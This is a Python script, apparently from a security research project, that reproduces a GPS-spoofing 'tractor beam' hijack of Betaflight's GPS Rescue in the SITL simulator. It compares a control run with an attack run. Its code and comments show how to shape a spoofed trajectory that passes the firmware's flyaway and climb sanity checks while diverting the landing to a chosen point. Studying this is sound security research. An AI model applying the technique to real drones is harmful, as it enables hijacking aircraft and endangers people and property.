"""Reproduces the core "Tractor Beam" mechanic against Betaflight SITL: during
GPS Rescue (Betaflight's RTH), feed a GPS trajectory that satisfies the
rescue's own sanity check (performSanityChecks() in gps_rescue_multirotor.c
requires distanceToHome to shrink at >=20% of the configured rescue speed,
750 cm/s by default, or it flags RESCUE_FLYAWAY after 20s) while steering the
reported position toward an attacker-chosen destination instead of the drone's
real armed-at "home" - a safe hijack rather than a naive GPS jump.

Two modes, run separately (each needs a fresh SITL launch so "home" is reset):
  --mode control   feeds the real GPS Rescue trajectory back to true home.
  --mode attack     feeds a trajectory of the same shape/speed, but ending at
                    an attacker-chosen point offset from true home.

Logs one CSV row/second to <mode>_walkoff.csv: elapsed time, armed state,
arming-disable flags, reported GPS, distance to true home, distance to the
attack target, motors, attitude.

Usage (SITL must already be running - see docs/setup/sitl-setup.md):
    python3 walkoff_experiment.py --mode control
    python3 walkoff_experiment.py --mode attack
"""

import argparse
import csv
import threading
import time

from tractorbeam.sitl_transport import SitlTransport, FdmState, results_csv_path
from tractorbeam.sitl_common import (
    RESCUE_PHASE_NAMES,
    RESCUE_FAILURE_NAMES,
    meters_to_latlon_delta,
    latlon_dist_m,
)

RESCUE_GROUND_SPEED_MS = 7.5  # groundSpeedCmS default, pg/gps_rescue_multirotor.c
BOOT_GRACE_S = 10.0
FLY_OUT_METERS_NORTH = 500.0
ATTACK_OFFSET_METERS_EAST = 150.0  # how far the hijacked landing is from true home
MAX_RESCUE_S = 100.0

# rescueState.phase / rescueState.failure, gps_rescue_multirotor.c - surfaced via
# `set debug_mode = RTH` (DEBUG_SET(DEBUG_RTH, 2, phase) / (..., 3, failure)),
# read back over MSP_DEBUG (254). Requires debug_mode=RTH baked into eeprom.bin
# (see docs/setup/sitl-setup.md / sitl_safety.txt).
# gps_rescue_ascend_rate / gps_rescue_return_alt defaults (see `get gps_rescue`).
# Without this, our FDM feed reports a perfectly static altitude while the
# rescue's RESCUE_ATTAIN_ALT phase keeps raising its target - altitudeControlError
# never resolves, so it never advances to ROTATE/FLY_HOME (empirically confirmed:
# it just climbs throttle forever and reports RESCUE_STALLED). Ramping our
# reported altitude plausibly lets the mission actually progress to the
# GPS-driven horizontal flight phase this experiment is meant to test.
ASCEND_RATE_MS = 7.5
PRE_CLIMB_M = (
    20.0  # held well before rescue trigger, well above gps_rescue_initial_climb=1
)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--mode", choices=["control", "attack"], required=True)
    args = parser.parse_args()

    transport = SitlTransport()
    state = FdmState()
    channels = [1500, 1500, 1000, 1500, 1000, 1000, 1000, 1000]
    running = True

    climb = {"active": False, "start_alt": None, "start_time": None, "delta": 0.0}

    def fdm_loop():
        while running:
            if climb["active"]:
                elapsed_climb = time.time() - climb["start_time"]
                state.alt = min(
                    climb["start_alt"] + climb["delta"],
                    climb["start_alt"] + ASCEND_RATE_MS * elapsed_climb,
                )
            transport.send_fdm(state, dt=0.01)
            time.sleep(0.01)

    def rc_loop():
        while running:
            transport.send_rc(channels)
            time.sleep(0.02)

    threading.Thread(target=fdm_loop, daemon=True).start()
    threading.Thread(target=rc_loop, daemon=True).start()

    home_lat, home_lon = state.lat, state.lon

    print(f"[{args.mode}] waiting {BOOT_GRACE_S:.0f}s boot grace...")
    time.sleep(BOOT_GRACE_S)

    channels[4] = 2000  # ARM
    time.sleep(1.0)

    # Pre-climb a small, fixed margin *before* flying out or triggering rescue,
    # and hold it well before the rescue math ever runs. maxAltitudeCm (see
    # design.md/gps_rescue_multirotor.c initRescueValues()) then already covers
    # this altitude, so with gps_rescue_initial_climb=1 the rescue's required
    # climb is ~1m instead of the ~10-30m gap that stalled RESCUE_ATTAIN_ALT in
    # earlier runs (getAltitudeCm()'s response to a big simulated jump lagged
    # or reset in ways not fully characterized - see conversation notes).
    print(f"[{args.mode}] pre-climbing {PRE_CLIMB_M:.0f}m and holding before flyout...")
    climb_start = state.alt
    t_climb0 = time.time()
    while state.alt < climb_start + PRE_CLIMB_M:
        state.alt = min(
            climb_start + PRE_CLIMB_M,
            climb_start + ASCEND_RATE_MS * (time.time() - t_climb0),
        )
        time.sleep(0.1)
    time.sleep(3.0)  # let maxAltitudeCm settle at the new altitude

    d_lat, d_lon = meters_to_latlon_delta(FLY_OUT_METERS_NORTH, 0.0, home_lat)
    state.lat = home_lat + d_lat
    state.lon = home_lon + d_lon
    flyout_lat, flyout_lon = state.lat, state.lon
    print(
        f"[{args.mode}] flown out {FLY_OUT_METERS_NORTH}m north of home to "
        f"({flyout_lat:.6f}, {flyout_lon:.6f}); home=({home_lat:.6f}, {home_lon:.6f}); alt={state.alt:.1f}m"
    )
    time.sleep(1.0)

    if args.mode == "control":
        target_lat, target_lon = home_lat, home_lon
    else:
        d_lat_off, d_lon_off = meters_to_latlon_delta(
            0.0, ATTACK_OFFSET_METERS_EAST, home_lat
        )
        target_lat, target_lon = home_lat + d_lat_off, home_lon + d_lon_off
    total_dist_m = latlon_dist_m(flyout_lat, flyout_lon, target_lat, target_lon)
    print(
        f"[{args.mode}] spoof target=({target_lat:.6f}, {target_lon:.6f}), "
        f"total_dist={total_dist_m:.1f}m"
    )

    channels[5] = 2000  # AUX2 high -> GPS Rescue
    # performSanityChecks()'s RESCUE_ATTAIN_ALT check is a *rate* comparison
    # (measured altitude change vs Betaflight's own internally-ramping target
    # change, each 1Hz tick) - not a one-shot distance check. Holding flat
    # after a one-off pre-climb (tried earlier) leaves measuredChange=0 while
    # Betaflight's target keeps climbing, so the ratio is always ~0 and it
    # reliably STALLs at exactly secondsFailing>=10 regardless of margin size.
    # Keep actively climbing at the same ascend rate from the moment rescue
    # triggers so both sides move together until Betaflight's own logic
    # detects "target reached" and stops raising its target.
    climb["start_alt"] = state.alt
    climb["start_time"] = time.time()
    climb["delta"] = 15.0
    climb["active"] = True
    print(
        f"[{args.mode}] GPS Rescue triggered, feeding spoofed trajectory at "
        f"{RESCUE_GROUND_SPEED_MS} m/s toward target, still climbing at "
        f"{ASCEND_RATE_MS} m/s to rate-match Betaflight's own ascent target..."
    )

    rows = []
    t0 = time.time()
    while True:
        elapsed = time.time() - t0
        frac = (
            min(1.0, (elapsed * RESCUE_GROUND_SPEED_MS) / total_dist_m)
            if total_dist_m > 0
            else 1.0
        )
        state.lat = flyout_lat + (target_lat - flyout_lat) * frac
        state.lon = flyout_lon + (target_lon - flyout_lon) * frac

        time.sleep(0.05)

        if int(elapsed * 10) % 10 == 0:  # once/sec
            transport.send_msp(101)
            _, status_data = transport.read_msp()
            transport.send_msp(106)
            _, gps_data = transport.read_msp()
            transport.send_msp(108)
            _, att_data = transport.read_msp()
            transport.send_msp(254)
            _, debug_data = transport.read_msp()
            motors = transport.get_motors(timeout=0.2)

            armed, flags = _parse_status(status_data)
            gps = _parse_gps(gps_data)
            att = _parse_attitude(att_data)
            rescue_phase, rescue_failure = _parse_rth_debug(debug_data)

            dist_true_home = latlon_dist_m(state.lat, state.lon, home_lat, home_lon)
            dist_target = latlon_dist_m(state.lat, state.lon, target_lat, target_lon)

            row = {
                "t": round(elapsed, 1),
                "armed": armed,
                "flags": ";".join(flags),
                "reported_lat": round(state.lat, 7),
                "reported_lon": round(state.lon, 7),
                "fc_gps_lat": gps["lat"] if gps else None,
                "fc_gps_lon": gps["lon"] if gps else None,
                "dist_true_home_m": round(dist_true_home, 1),
                "dist_target_m": round(dist_target, 1),
                "frac": round(frac, 3),
                "motors": motors,
                "roll": att["roll"] if att else None,
                "pitch": att["pitch"] if att else None,
                "rescue_phase": rescue_phase,
                "rescue_failure": rescue_failure,
            }
            rows.append(row)
            print(
                f"[{args.mode}] t={row['t']:6.1f}s armed={armed} flags={flags} "
                f"frac={frac:.2f} dist_home={dist_true_home:6.1f}m dist_target={dist_target:6.1f}m "
                f"motors={motors} rescue_phase={rescue_phase} rescue_failure={rescue_failure}"
            )

            if not armed:
                print(f"[{args.mode}] DISARMED - stopping")
                break

        if frac >= 1.0 and elapsed > total_dist_m / RESCUE_GROUND_SPEED_MS + 3:
            print(
                f"[{args.mode}] spoofed trajectory complete, holding 5s then stopping"
            )
            time.sleep(5.0)
            break

        if elapsed > MAX_RESCUE_S:
            print(f"[{args.mode}] max duration reached, stopping")
            break

    out_path = results_csv_path(f"{args.mode}_walkoff.csv")
    with open(out_path, "w", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=list(rows[0].keys()))
        writer.writeheader()
        writer.writerows(rows)
    print(f"[{args.mode}] wrote {len(rows)} rows to {out_path}")

    running = False
    time.sleep(0.3)
    transport.close()


def _parse_status(data):
    import struct

    if not data or len(data) < 11:
        return None, []
    cycle_time, i2c_err, sensors_bm, flags32, pid_profile_idx = struct.unpack_from(
        "<HHHIB", data, 0
    )
    armed = (flags32 & 1) == 1
    names = [
        "NOGYRO",
        "FAILSAFE",
        "RXLOSS",
        "NOT_DISARMED",
        "BOXFAILSAFE",
        "RUNAWAY",
        "CRASH",
        "THROTTLE",
        "ANGLE",
        "BOOTGRACE",
        "NOPREARM",
        "LOAD",
        "CALIB",
        "CLI",
        "CMS",
        "BST",
        "MSP",
        "PARALYZE",
        "GPS",
        "RESCUE_SW",
        "DSHOT_TELEM",
        "REBOOT_REQD",
        "DSHOT_BBANG",
        "NO_ACC_CAL",
        "MOTOR_PROTO",
        "FLIP_SWITCH",
        "ALT_HOLD_SW",
        "POS_HOLD_SW",
        "AUTOPILOT_SW",
        "ARM_SWITCH",
    ]
    offset = 11 + 4
    if len(data) < offset + 1:
        return armed, []
    extra = data[offset]
    offset += 1 + extra
    if len(data) < offset + 1 + 4:
        return armed, []
    flag_count = data[offset]
    offset += 1
    bitmask = struct.unpack_from("<I", data, offset)[0]
    flags = [n for i, n in enumerate(names) if i < flag_count and bitmask & (1 << i)]
    return armed, flags


def _parse_gps(data):
    import struct

    if not data or len(data) < 16:
        return None
    u = struct.unpack_from("<BBiiHHH", data, 0)
    return {"fix": u[0], "sats": u[1], "lat": u[2] / 1e7, "lon": u[3] / 1e7}


def _parse_attitude(data):
    import struct

    if not data or len(data) < 6:
        return None
    u = struct.unpack_from("<hhh", data, 0)
    return {"roll": u[0] / 10.0, "pitch": u[1] / 10.0, "yaw": u[2]}


def _parse_rth_debug(data):
    """debug[2]=rescueState.phase, debug[3]=rescueState.failure, per
    DEBUG_SET(DEBUG_RTH, 2/3, ...) in gps_rescue_multirotor.c (requires
    `set debug_mode = RTH`)."""
    import struct

    if not data or len(data) < 8:
        return None, None
    debug = struct.unpack_from("<4h", data, 0)
    phase = (
        RESCUE_PHASE_NAMES[debug[2]]
        if 0 <= debug[2] < len(RESCUE_PHASE_NAMES)
        else debug[2]
    )
    failure = (
        RESCUE_FAILURE_NAMES[debug[3]]
        if 0 <= debug[3] < len(RESCUE_FAILURE_NAMES)
        else debug[3]
    )
    return phase, failure


if __name__ == "__main__":
    main()
